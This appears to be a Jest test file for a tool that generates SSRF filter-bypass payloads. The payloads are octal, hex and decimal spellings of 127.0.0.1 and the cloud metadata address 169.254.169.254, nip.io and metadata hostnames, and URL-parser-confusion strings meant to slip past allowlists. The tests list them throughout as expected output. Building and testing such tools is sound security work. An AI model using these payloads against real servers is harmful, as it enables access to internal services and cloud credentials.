import {
  parseTarget,
  toIpv4Int,
  classifyTarget,
  describeIpv4,
  bypassPayloads,
  bypassPayloadsText,
  formatBypassResult,
  payloadFor,
  renderWithHost,
} from '@/Components/Functions/SsrfBypassTools/logic';

const payloads = (input: string, allowed?: string) => {
  const result = bypassPayloads(input, { allowed });
  return result.variants.map((v) => payloadFor(result.target, v));
};

const labelled = (input: string, label: string) => {
  const result = bypassPayloads(input);
  const variant = result.variants.find((v) => v.label === label);
  if (!variant) throw new Error(`no variant labelled "${label}"`);
  return payloadFor(result.target, variant);
};

describe('parseTarget', () => {
  it('splits a full URL', () => {
    expect(parseTarget('http://127.0.0.1:8080/admin?a=1#x')).toEqual({
      scheme: 'http',
      userinfo: '',
      host: '127.0.0.1',
      port: '8080',
      rest: '/admin?a=1#x',
    });
  });

  it('reads a bare address', () => {
    expect(parseTarget('127.0.0.1')).toEqual({
      scheme: '',
      userinfo: '',
      host: '127.0.0.1',
      port: '',
      rest: '',
    });
  });

  it('keeps a bare IPv6 literal whole rather than reading a port off it', () => {
    expect(parseTarget('::1').host).toBe('::1');
    expect(parseTarget('fd00:ec2::254').port).toBe('');
  });

  it('unwraps a bracketed IPv6 host with a port', () => {
    const parsed = parseTarget('https://[::1]:443/x');
    expect(parsed.host).toBe('::1');
    expect(parsed.port).toBe('443');
  });

  it('strips userinfo', () => {
    expect(parseTarget('http://user:pass@example.com/').userinfo).toBe('user:pass');
  });

  it('rejects empty input', () => {
    expect(() => parseTarget('   ')).toThrow(/Enter an address/);
  });

  it('rejects an unclosed bracket', () => {
    expect(() => parseTarget('http://[::1/x')).toThrow(/Unclosed/);
  });
});

describe('toIpv4Int', () => {
  it('reads a dotted quad', () => {
    expect(toIpv4Int('127.0.0.1')).toBe(2130706433);
    expect(toIpv4Int('255.255.255.255')).toBe(4294967295);
  });

  it('reads a bare dword', () => {
    expect(toIpv4Int('2130706433')).toBe(2130706433);
  });

  it('rejects an octet above 255 and anything out of range', () => {
    expect(toIpv4Int('127.0.0.256')).toBeNull();
    expect(toIpv4Int('4294967296')).toBeNull();
    expect(toIpv4Int('example.com')).toBeNull();
  });
});

describe('classifyTarget', () => {
  it('tells the three kinds apart', () => {
    expect(classifyTarget('127.0.0.1')).toBe('ipv4');
    expect(classifyTarget('::1')).toBe('ipv6');
    expect(classifyTarget('localhost')).toBe('host');
  });
});

describe('describeIpv4', () => {
  it('names the ranges that matter to an allowlist', () => {
    expect(describeIpv4(0x7f000001)).toMatch(/loopback/);
    expect(describeIpv4(0xa9fea9fe)).toMatch(/metadata/);
    expect(describeIpv4(0x0a000001)).toMatch(/private/);
    expect(describeIpv4(0xc0a80101)).toMatch(/private/);
    expect(describeIpv4(0x08080808)).toBe('public address');
  });
});

describe('IPv4 numeric formats', () => {
  it('produces the classic loopback spellings', () => {
    expect(labelled('127.0.0.1', 'Decimal')).toBe('2130706433');
    expect(labelled('127.0.0.1', 'Octal')).toBe('0177.0000.0000.0001');
    expect(labelled('127.0.0.1', 'Octal dword')).toBe('017700000001');
    expect(labelled('127.0.0.1', 'Hex')).toBe('0x7f000001');
    expect(labelled('127.0.0.1', 'Dotted hex')).toBe('0x7f.0x00.0x00.0x01');
    expect(labelled('127.0.0.1', 'Two-part (class A)')).toBe('127.1');
    expect(labelled('127.0.0.1', 'Three-part (class B)')).toBe('127.0.1');
    expect(labelled('127.0.0.1', 'Mixed hex/decimal')).toBe('0x7f.1');
    expect(labelled('127.0.0.1', 'Decimal overflow')).toBe('6425673729');
  });

  it('produces the IPv6 spellings of an IPv4 address', () => {
    expect(labelled('127.0.0.1', 'IPv4-mapped IPv6')).toBe('[::ffff:127.0.0.1]');
    expect(labelled('127.0.0.1', 'IPv4-mapped (hex)')).toBe('[::ffff:7f00:1]');
    expect(labelled('127.0.0.1', 'IPv4-compatible')).toBe('[::127.0.0.1]');
  });

  it('round-trips every numeric form back to the same address', () => {
    // Each spelling below is what `inet_aton` would read as 2130706433.
    for (const form of ['2130706433', '0x7f000001', '017700000001', '127.1', '127.0.1']) {
      expect(payloads('127.0.0.1')).toContain(form);
    }
  });

  it('handles an address whose octets are not zero', () => {
    expect(labelled('169.254.169.254', 'Decimal')).toBe('2852039166');
    expect(labelled('169.254.169.254', 'Octal')).toBe('0251.0376.0251.0376');
    expect(labelled('169.254.169.254', 'Hex')).toBe('0xa9fea9fe');
  });
});

describe('aliases', () => {
  it('offers the loopback names for a loopback address', () => {
    const list = payloads('127.0.0.1');
    expect(list).toContain('localhost');
    expect(list).toContain('0');
    expect(list).toContain('127.0.0.1.nip.io');
    expect(list).toContain('127-0-0-1.nip.io');
    expect(list).toContain('7f000001.nip.io');
  });

  it('offers the cloud metadata names only for the metadata address', () => {
    expect(payloads('169.254.169.254')).toContain('metadata.google.internal');
    expect(payloads('10.0.0.1')).not.toContain('metadata.google.internal');
  });

  it('offers loopback addresses when the target is named localhost', () => {
    const list = payloads('http://localhost:3000/');
    expect(list).toContain('http://127.0.0.1:3000/');
    expect(list).toContain('http://2130706433:3000/');
    expect(list).toContain('http://[::1]:3000/');
  });

  it('gives ::1 the loopback aliases too', () => {
    expect(payloads('::1')).toContain('localhost');
  });
});

describe('host string mangling', () => {
  it('mangles the separators of a hostname', () => {
    const list = payloads('internal.example.com');
    expect(list).toContain('internal.example.com.');
    expect(list).toContain('INTERNAL.EXAMPLE.COM');
    expect(list).toContain('internal。example。com');
    expect(list).toContain('internal%2eexample%2ecom');
    expect(list).toContain('internal%252eexample%252ecom');
  });

  it('mangles a dotted quad the same way', () => {
    expect(payloads('127.0.0.1')).toContain('127。0。0。1');
  });
});

describe('URL parser confusion', () => {
  it('puts the allowlisted host in the userinfo', () => {
    expect(payloads('http://127.0.0.1:8080/admin', 'intranet.corp')).toContain(
      'http://intranet.corp@127.0.0.1:8080/admin',
    );
  });

  it('emits the parser-differential set', () => {
    const list = payloads('http://127.0.0.1/x', 'ok.test');
    expect(list).toContain('http://ok.test@@127.0.0.1/x');
    expect(list).toContain('http://ok.test\\@127.0.0.1/x');
    expect(list).toContain('http://ok.test#@127.0.0.1/x');
    expect(list).toContain('http://ok.test?@127.0.0.1/x');
    expect(list).toContain('http:/127.0.0.1/x');
    expect(list).toContain('//127.0.0.1/x');
  });

  it('assumes http for a bare host so the URL payloads still make sense', () => {
    expect(payloads('127.0.0.1', 'ok.test')).toContain('http://ok.test@127.0.0.1');
  });

  it('appends the allowlisted host with & when the URL already has a query', () => {
    const list = payloads('http://127.0.0.1/x?a=1', 'ok.test');
    expect(list).toContain('http://127.0.0.1/x?a=1&host=ok.test');
  });

  it('brackets an IPv6 host inside the URL payloads', () => {
    expect(payloads('http://[::1]:8080/', 'ok.test')).toContain('http://ok.test@[::1]:8080/');
  });

  it('falls back to a placeholder allowlisted host', () => {
    expect(bypassPayloads('127.0.0.1').allowed).toBe('allowed.example.com');
  });
});

describe('shape of the result', () => {
  it('keeps the port and path on every host substitution', () => {
    for (const payload of payloads('https://127.0.0.1:8443/v1/secrets')) {
      expect(payload).toContain('/v1/secrets');
    }
  });

  it('preserves userinfo already in the input', () => {
    expect(renderWithHost(parseTarget('http://u:p@127.0.0.1/x'), '2130706433')).toBe(
      'http://u:p@2130706433/x',
    );
  });

  it('drops duplicates', () => {
    const list = payloads('127.0.0.1');
    expect(new Set(list).size).toBe(list.length);
  });

  it('filters by section', () => {
    const only = bypassPayloads('127.0.0.1', { sections: ['ip'] });
    expect(only.variants.every((v) => v.section === 'ip')).toBe(true);
  });
});

describe('formatting', () => {
  it('labels each payload and heads each section', () => {
    const text = formatBypassResult(bypassPayloads('127.0.0.1'));
    expect(text).toContain('# 127.0.0.1 — loopback (127.0.0.0/8)');
    expect(text).toContain('## Address formats');
    expect(text).toContain('## Same destination, other names');
    expect(text).toMatch(/^Decimal +2130706433$/m);
  });

  it('drops the labels when asked for payloads only', () => {
    const result = bypassPayloads('127.0.0.1');
    const bare = formatBypassResult(result, false).split('\n');
    expect(bare).toHaveLength(result.variants.length);
    expect(bare).toContain('0x7f000001');
  });
});

describe('bypassPayloadsText', () => {
  it('is the pipeline form: bare payloads, one per line', () => {
    const lines = bypassPayloadsText('127.0.0.1').split('\n');
    expect(lines).toContain('2130706433');
    expect(lines.some((l) => l.includes(' '))).toBe(false);
  });

  it('handles several targets at once', () => {
    const text = bypassPayloadsText('127.0.0.1\n169.254.169.254');
    expect(text).toContain('2130706433');
    expect(text).toContain('2852039166');
  });

  it('throws on empty input', () => {
    expect(() => bypassPayloadsText('  \n ')).toThrow(/Enter an address/);
  });
});
